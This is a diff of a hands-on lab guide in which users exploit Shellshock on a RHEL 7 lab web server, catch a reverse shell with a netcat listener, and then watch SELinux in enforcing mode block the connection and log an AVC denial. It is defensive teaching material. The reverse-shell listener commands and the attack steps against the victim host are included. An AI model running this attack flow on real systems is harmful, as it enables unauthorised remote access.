@@ -1,13 +1,28 @@
 
 = Security Enhanced Linux
 
-== Exploiting Red Hat Enterprise Linux 7 with Shellshock vulnerability
-with SELinux in Enforcing mode vs. Permissive mode
+Security Enhanced Linux is a representative of Proactive Security. In case of SELinux it means that a system is protected from consequences of exploits in window of vulnerability until a security fix is released. This protection is done by defined SELinux policy on your system.
 
-== Introduction
+The lab is split to three parts. In the first part, you will become a hacker and you will try to proceed a real vulnerability on given Red Hat Enterprise Linux 7 system and explore how SELinux helps to protect this system. In the second part, you will turn SELinux on for an environment containing a setup of web servers. In the last part, you will configure SELinux according to a STIG rule.
+
+== SELinux policy
+SELinux *isolates* all processes running on the system to *mitigate* attacks which take advantage of privilege escalation. Privilege escalation means that a process gains more access rights than it should have. To prevent this, SELinux enforces Mandatory Access Control (MAC) mechanism over all processes. It labels every process, file, or directory according to rules specified in a security policy known as the SELinux policy. The SELinux policy also specifies how processes interact with each other and how they can access files and directories. SELinux denies every action that it is not explicitly allowed by the SELinux policy.
+
+Do we have any real example where this mentioned process isolation helped from a privilege escalation of an exploit? 
+
+Yes, we have.
+
+Let's become a hacker and try to exploit Red Hat Enterprise Linux 7 with Shellshock vulnerability.
+
+== Exploiting Red Hat Enterprise Linux 7 with Shellshock vulnerability
+
 <Describe shellshock vulnerability, root issue in exploit was allowing
 put command after env variable in command, we'll use this vuln and try
 to gain access to selinux4 system>
+
+What does SELinux do to contain the the bash exploit (ShellShock)?
+
+<put two pictures which will tell that SELiux does not prevent from exploit but take advantage of privilege escalation>
 
 === Lab User Story
 <As an enterprise admin I want to have SELinux in enforcing mode to
@@ -21,28 +36,103 @@ The lab exercise is split into three steps:
 . Exploiting RHEL system with SELinux in Enforcing mode
 . Analyzing SELinux denials
 
+=== Configuration
+
+Exploit will be executed from _selinux1_ system, therefore use ssh to connect _selinux1_ system.
+
+    # ssh root@selinux1
+
+Move to directory /root/selinux_sctipts/ where are all the scripts needed for provide attack.
+
+    # cd /root/selinux_scripts
+
+It's needed to have two terminals opened, one for listening on 9999 tcp port, second one for executing exploit script. Please, open two terminals connect to selinux1 system and change directory to /root/selinux_scripts.
+
+Following image describing flow how exploit will be provided. One left side there is victim server (selinux4 system) and from attacker machine will be http request send and part of this httpd request will be revert shell to attacker machine listening on tcp port 9999
+
+image:images/lab2-shellshock-flow.png[]
 
 === Exploiting system with SELinux in Permissive mode
 
-==== Set SELinux to permissive mode
+_selinux4_ system has SELinux in permissive mode by default, there is running Apache service running with old version of bash. Everything is ready to run the exploit.
 
-==== Bind tcp port for listening
+Based on flow of the ShellShock! attack, it's necessary to start listening on tcp port 9999 on selinux1 system.
 
-==== Run the Exploit
+    # nc -lvp 9999
+    Ncat: Version 7.50 ( https://nmap.org/ncat )
+    Ncat: Listening on :::9999
+    Ncat: Listening on 0.0.0.0:9999
+
+Ncat is a feature-packed networking utility which reads and writes data across networks from the command line.
+
+Now, from another terminal, let's run the exploit
+
+    # ./shellshock_exploit.sh
+
+Right now, on terminal where nc command was executed, bash promnt should appeared.
+
+    # nc -lvp 9999
+    Ncat: Version 7.50 ( https://nmap.org/ncat )
+    Ncat: Listening on :::9999
+    Ncat: Listening on 0.0.0.0:9999
+    Ncat: Connection from 192.168.0.24.
+    Ncat: Connection from 192.168.0.24:38668.
+    bash: no job control in this shell
+    bash-4.2$
+
+For testing purpose, few commands could be executed on victim (_selinux4_ machine)
+
+    bash-4.2$ id
+    id
+    uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_sys_script_t:s0
+    bash-4.2$ uname -a
+    uname -a
+    Linux selinux4.example.com 3.10.0-418.el7.x86_64 #1 SMP Thu May 26 20:35:02 EDT 2016 x86_64 x86_64 x86_64 GNU/Linux
+
+    # exit
 
 ==== Set SELinux to enforcing mode
 
-==== Bind tcp port for listening
+Victim server (_selinux4_ system) has SELinux in permissive mode. Now, let's switch SELinux to enforcing and repeat the attack.
 
-==== Run the Exploit
+Connect to _selinux4_ and switch to Enforcing mode
+
+    # ssh root@selinux4
+    # setenforce 1
+    # exit
+
+=== Exploiting system with SELinux in Enforcing mode
+
+Right now, attack will be repeated but SELinux is in Enforcing mode on victim server (_selinux4_ system)
+
+Based on flow of the _ShellShock!_ attack, it's necessary to start listening on tcp port 9999 on _selinux1_ system.
+
+    # nc -lvp 9999
+    Ncat: Version 7.50 ( https://nmap.org/ncat )
+    Ncat: Listening on :::9999
+    Ncat: Listening on 0.0.0.0:9999
+
+_Ncat_ is a feature-packed networking utility which reads and writes data across networks from the command line.
+
+Now, from another terminal, let's run the exploit
+
+    # ./shellshock_exploit.sh
+
+As you can see, there is no bash prompt on terminal where you used _nc_ command, because SELinux blocked this access. SELinux did his job!
 
 ==== Analyzing SELinux denial
 
+Let's analyze what happened and why SELinux blocked ShellShock! exploit.
+
+Connect to selinux4 system from selinux1 machine
+
+    # ssh root@selinux4
+    # ausearch -m AVC -ts today | grep name_connect
+    type=AVC msg=audit(1524909646.681:86): avc:  denied  { name_connect } for  pid=2091 comm="bashbug.sh" dest=9999 scontext=system_u:system_r:httpd_sys_script_t:s0 tcontext=system_u:object_r:jboss_management_port_t:s0 tclass=tcp_socket
+
+This is avc record from Audit daemon, which saying that cgi script called bashbug.sh labeled as httpd_sys_script_t tried to connect to tcp port 9999 labeled as jboss_management_port_t, fortunately there is no allow rules for this access, so it was denied by kernel and SELinux mitigate this attack.
 
 = Enabling SELinux via Ansible
-
-== Introduction
-SELinux *isolates* all processes running on the system to *mitigate* attacks which take advantage of privilege escalation. Privilege escalation means that a process gains more access rights than it should have. To prevent this, SELinux enforces Mandatory Access Control (MAC) mechanism over all processes. It labels every process, file, or directory according to rules specified in a security policy known as the SELinux policy. The SELinux policy also specifies how processes interact with each other and how they can access files and directories. SELinux denies every action that it is not explicitly allowed by the SELinux policy.
 
 === Lab User Story
 
